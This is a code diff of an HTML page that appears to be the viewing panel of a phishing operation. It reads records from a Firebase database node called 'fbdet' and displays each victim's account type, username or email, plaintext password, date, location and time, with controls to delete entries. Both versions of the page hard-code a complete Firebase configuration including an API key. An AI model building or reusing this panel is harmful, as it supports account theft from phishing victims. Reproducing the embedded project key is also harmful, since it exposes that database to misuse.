@@ -1,75 +1,72 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype HTML>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Database</title>
+  <title>Database </title>
 </head>
 <body>
+  <div></div>
   <div id="save">
-    <!-- Data will be displayed here -->
+
   </div>
-  <script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-auth.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+
   <script>
-    // Your Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyDhn80byD69jCo4oexdKdkCHUgGw9nO6CM",
-      authDomain: "dubai4db.firebaseapp.com",
-      databaseURL: "https://dubai4db-default-rtdb.firebaseio.com",
-      projectId: "dubai4db",
-      storageBucket: "dubai4db.appspot.com",
-      messagingSenderId: "776520121975",
-      appId: "1:776520121975:web:248815949672b2c4371072"
-    };
-    
-    // Initialize Firebase
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDhn80byD69jCo4oexdKdkCHUgGw9nO6CM",
+  authDomain: "dubai4db.firebaseapp.com",
+  databaseURL: "https://dubai4db-default-rtdb.firebaseio.com",
+  projectId: "dubai4db",
+  storageBucket: "dubai4db.appspot.com",
+  messagingSenderId: "776520121975",
+  appId: "1:776520121975:web:248815949672b2c4371072"
+};
     firebase.initializeApp(firebaseConfig);
-    
-    // Sign in anonymously
     firebase.auth().signInAnonymously().catch(function(error) {
+
+      // Handle Errors here.
+
+      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+
+      window.alert("Error : " + errorMessage);
+
+      // ...
     });
-    
-    // Reference to the Firebase database
-    const database = firebase.database();
-    const fbdetRef = database.ref("fbdet");
-    
-    // Display data from Firebase
-    fbdetRef.on("child_added", function(snapshot) {
-      var data = snapshot.val();
-      var html = `
-        <hr>
-        <li id="message-${snapshot.key}" class="canvaschat">
-          Account type: <b>${data.type}</b> <br>
-          User: <b>${data.emle}</b><br>
-          Password: <b>${data.pass}</b> <br>
-          Date: <b>${data.date}</b><br>
-          Location: <b>${data.timezone}</b><br>
-          Time: <b>${data.time}</b>
-          <button data-id="${snapshot.key}" onclick="deleteMessage(this);" class="send">
-            Delete
-          </button>
-        </li>`;
-      document.getElementById("data-display").insertAdjacentHTML("beforeend", html);
+    firebase.database().ref("fbdet").on("child_added", function (snapshot) {
+
+
+
+      var html = "";
+
+      html += "<hr></hr>"
+      html += "<li id='message-" + snapshot.key + "' class= 'canvaschat'>";
+
+      html += "Account type: <b>"+snapshot.val().type+ "</b> <br> User: <b> " + snapshot.val().emle+ "</b><br> Password: <b> " +snapshot.val().pass+ "</b> <br> Date: <b>" +snapshot.val().date+"</b><br>Location: <b>"+snapshot.val().timezone+"</b><br> Time: <b>"+snapshot.val().time+"</b>";
+      html += "</li>";
+      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class = 'send'>";
+      html += "Delete";
+      html += "</button>";
+
+      document.getElementById("save").innerHTML += html;
     });
-    
-    // Delete message
-    function deleteMessage(button) {
-      var messageId = button.getAttribute("data-id");
-      fbdetRef.child(messageId).remove();
+    function deleteMessage(self) {
+
+      var messageId = self.getAttribute("data-id");
+
+      firebase.database().ref("fbdet").child(messageId).remove();
     }
-    
-    // Update UI on child_removed event
-    fbdetRef.on("child_removed", function(snapshot) {
-      var messageId = snapshot.key;
-      var messageElement = document.getElementById("message-" + messageId);
-      if (messageElement) {
-        messageElement.innerHTML = "deleted";
-      }
+    firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
+      // remove message node
+      document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
     });
+
   </script>
 </body>
 </html>
